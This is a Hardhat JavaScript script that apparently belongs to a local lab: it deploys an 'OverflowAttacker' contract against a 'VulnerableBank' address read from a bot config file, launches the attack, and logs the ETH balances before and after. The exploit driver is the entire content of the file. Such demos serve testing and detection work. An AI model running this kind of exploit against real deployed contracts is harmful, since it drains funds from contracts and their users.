import { network } from "hardhat";
import fs from "fs";
import { fileURLToPath } from "url";

async function main() {
    const { ethers } = await network.connect();
    const [deployer] = await ethers.getSigners();
    console.log("Attacker:", deployer.address);

    const configPath = fileURLToPath(new URL("../bot/config.json", import.meta.url));
    const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
    const entry = config.contracts.find(c => c.type === "overflow");

    if (!entry) {
        console.error("No VulnerableBank address in config. Run scripts/deployBank.js first.");
        process.exit(1);
    }
    console.log("Using VulnerableBank at:", entry.address);

    const OverflowAttacker = await ethers.getContractFactory("OverflowAttacker");
    const attacker = await OverflowAttacker.deploy(entry.address);
    await attacker.waitForDeployment();
    console.log("OverflowAttacker deployed at:", await attacker.getAddress());

    const bankBalance = await ethers.provider.getBalance(entry.address);
    console.log("\n=== BEFORE ATTACK ===");
    console.log("VulnerableBank:", ethers.formatEther(bankBalance), "ETH");

    console.log("\n🚨 LAUNCHING OVERFLOW ATTACK...");
    const tx = await attacker.attack({ value: 1n, gasLimit: 3000000 });
    console.log("Attack TX:", tx.hash);
    await tx.wait();
    console.log("Attack TX mined!");

    const bankBalanceAfter = await ethers.provider.getBalance(entry.address);
    const attackerBalance = await ethers.provider.getBalance(await attacker.getAddress());
    console.log("\n=== AFTER ATTACK ===");
    console.log("VulnerableBank:", ethers.formatEther(bankBalanceAfter), "ETH");
    console.log("OverflowAttacker:", ethers.formatEther(attackerBalance), "ETH");
}

main().catch(console.error);
